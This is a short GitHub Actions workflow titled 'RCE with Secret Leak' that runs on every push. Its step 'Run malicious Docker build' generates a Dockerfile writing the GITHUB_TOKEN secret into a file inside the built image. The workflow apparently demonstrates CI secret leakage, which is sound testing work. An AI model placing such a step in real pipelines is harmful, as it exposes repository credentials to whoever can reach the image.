name: RCE with Secret Leak

on:
  push:

jobs:
  rce:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repository
        uses: actions/checkout@v2

      - name: Run malicious Docker build
        run: |
          echo -e 'FROM alpine\nRUN echo $GITHUB_TOKEN > /leaked' > Dockerfile
          docker build -t test-image .
